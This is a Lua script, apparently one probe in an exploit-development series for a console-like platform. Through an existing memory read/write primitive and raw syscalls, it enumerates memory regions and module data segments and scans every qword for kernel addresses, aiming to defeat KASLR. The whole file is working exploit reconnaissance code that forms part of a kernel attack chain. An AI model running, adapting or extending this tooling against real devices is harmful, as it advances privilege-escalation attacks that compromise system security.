-- CRASH_CLASS: LOW
-- PROBE 73b: Scan ALL system library writable data segments for kernel pointers
--
-- Context: We scanned libkernel data (dead end) but there are 39 modules.
-- sys 674 shows writable data regions (prot=0x3 = RW) for every loaded module.
-- These regions may contain kernel addresses stored during library initialization
-- (e.g., syscall stubs storing handler addresses, TLS containing kernel refs).
--
-- Strategy:
--   1. Use sys 674 to enumerate all VM regions
--   2. Find regions with prot=0x3 (RW) that belong to system libraries
--   3. Read every qword in each region
--   4. Check for kernel pointer pattern (hi >= 0xFFFF8000)
--
-- SAFE: writable data (p=0x3) is readable. XO (.text p=0x4) and
-- unreadable .rodata (p=0x1) are NOT touched.

print("=== PROBE 73b: MODULE DATA KERNEL POINTER SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- ============================================================
-- [A] Enumerate VM regions via sys 674
-- ============================================================
print("[A] Enumerating VM regions...")

local ENTRY_SIZE = 72
local MAX_ENTRIES = 400
local buf = memory.alloc(ENTRY_SIZE * MAX_ENTRIES)
local count_ptr = memory.alloc(8)
wd(N(count_ptr), MAX_ENTRIES)

local ret = nil
pcall(function()
    ret = mk(674)(uint64(N(buf)), uint64(N(count_ptr)))
end)

local num_regions = rd(N(count_ptr)) or 0
print(string.format("  674 ret=%s, regions=%d", tostring(ret), num_regions))

-- Parse regions: find RW (prot=3) segments
local rw_regions = {}
for i = 0, num_regions - 1 do
    local base = N(buf) + i * ENTRY_SIZE
    local start_val = rq(base + 0x00)
    local end_val = rq(base + 0x08)
    local prot = rd(base + 0x18)

    if start_val and end_val and prot == 3 then
        local s_h, s_l = get_hi_lo(start_val)
        local e_h, e_l = get_hi_lo(end_val)

        -- Read name at +0x20 (null-terminated)
        local name_bytes = {}
        for j = 0, 31 do
            local b = rd(base + 0x20 + j)
            if not b or b == 0 then break end
            -- Extract characters from dword
            for k = 0, 3 do
                local ch = b % 256
                b = math.floor(b / 256)
                if ch == 0 then break end
                if ch >= 32 and ch <= 126 then
                    table.insert(name_bytes, string.char(ch))
                end
            end
            if #name_bytes > 40 then break end
        end
        local name = table.concat(name_bytes)

        local size = 0
        if s_h == e_h then
            size = e_l - s_l
        else
            size = (e_h - s_h) * 0x100000000 + (e_l - s_l)
        end

        -- Skip regions larger than 16MB (probably heap/GPU, not library data)
        -- and skip regions with no name (anonymous)
        if size > 0 and size <= 0x1000000 and #name > 0 then
            table.insert(rw_regions, {
                start_h = s_h, start_l = s_l,
                end_h = e_h, end_l = e_l,
                size = size, name = name
            })
        end
    end
end

print(string.format("  Found %d named RW regions (libraries)", #rw_regions))

-- ============================================================
-- [B] Scan each RW region for kernel pointers
-- ============================================================
print("")
print("[B] Scanning RW regions for kernel pointers...")

local total_kptrs = 0
local total_qwords = 0
local MAX_SCAN_PER_REGION = 0x40000  -- 256KB max per region

for idx, reg in ipairs(rw_regions) do
    if not alive() then print("DEAD during scan"); break end

    local scan_size = reg.size
    if scan_size > MAX_SCAN_PER_REGION then
        scan_size = MAX_SCAN_PER_REGION
    end

    local region_kptrs = 0
    local region_qwords = 0

    for off = 0, scan_size - 8, 8 do
        local addr = uint64(string.format("0x%X%08X", reg.start_h, reg.start_l + off))
        local val = rq(addr)
        if val then
            region_qwords = region_qwords + 1
            local h, l = get_hi_lo(val)
            -- Kernel pointer: hi >= 0xFFFF8000 but NOT sentinel patterns
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                region_kptrs = region_kptrs + 1
                total_kptrs = total_kptrs + 1
                print(string.format("  *** KPTR [%s] +0x%04X: 0x%08X%08X ***",
                    reg.name, off, h, l))
            end
        else
            break  -- unreadable, stop this region
        end

        total_qwords = total_qwords + 1
    end

    -- Print summary per region
    if region_kptrs > 0 then
        print(string.format("  %s: %d kptrs in %d qwords (size=0x%X)",
            reg.name, region_kptrs, region_qwords, reg.size))
    end

    -- Progress every 10 regions
    if idx % 10 == 0 then
        print(string.format("  ... %d/%d regions scanned, %d kptrs, %d qwords total",
            idx, #rw_regions, total_kptrs, total_qwords))
    end
end

-- ============================================================
-- [C] Also scan known library data offsets
-- ============================================================
print("")
print("[C] Targeted scans of key module data sections")

-- Get module info for handles 0-38
local info_buf = memory.alloc(0x200)
local key_modules = {}

for handle = 0, 38 do
    if not alive() then break end
    wd(N(info_buf), 0x160)
    local ok = pcall(function()
        mk(593)(uint64(handle), info_buf)
    end)
    if ok then
        local txt_lo = rd(N(info_buf) + 0x108)
        local txt_hi = rd(N(info_buf) + 0x10C)
        local txt_sz_lo = rd(N(info_buf) + 0x110)
        local txt_sz_hi = rd(N(info_buf) + 0x114)
        local dat_lo = rd(N(info_buf) + 0x118)
        local dat_hi = rd(N(info_buf) + 0x11C)
        local dat_sz_lo = rd(N(info_buf) + 0x120)
        local dat_sz_hi = rd(N(info_buf) + 0x124)

        if dat_lo and dat_hi and dat_sz_lo and dat_sz_hi then
            local dat_size = dat_sz_lo
            if dat_size > 0 and dat_size < 0x1000000 then
                table.insert(key_modules, {
                    handle = handle,
                    data_h = dat_hi, data_l = dat_lo,
                    data_size = dat_size
                })
            end
        end
    end
end

print(string.format("  %d modules with data segments", #key_modules))

local mod_kptrs = 0
for _, mod in ipairs(key_modules) do
    if not alive() then break end

    local scan_size = mod.data_size
    if scan_size > 0x80000 then scan_size = 0x80000 end

    local mod_hits = 0
    for off = 0, scan_size - 8, 8 do
        local addr = uint64(string.format("0x%X%08X", mod.data_h, mod.data_l + off))
        local val = rq(addr)
        if val then
            local h, l = get_hi_lo(val)
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                mod_hits = mod_hits + 1
                mod_kptrs = mod_kptrs + 1
                print(string.format("  *** KPTR h=%d data+0x%04X: 0x%08X%08X ***",
                    mod.handle, off, h, l))
            end
        else
            break
        end
    end
end

-- ============================================================
-- [D] SUMMARY
-- ============================================================
print("")
print("[D] SUMMARY")
print(string.format("  VM regions scanned: %d", #rw_regions))
print(string.format("  Module data segments: %d", #key_modules))
print(string.format("  Total qwords read: %d", total_qwords))
print(string.format("  VM region kptrs: %d", total_kptrs))
print(string.format("  Module data kptrs: %d", mod_kptrs))

if total_kptrs + mod_kptrs > 0 then
    print("")
    print("  *** KERNEL POINTERS FOUND — KASLR DEFEATED ***")
else
    print("")
    print("  Zero kernel pointers in any readable data segment.")
    print("  All system library writable data is clean.")
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 73b COMPLETE ===")
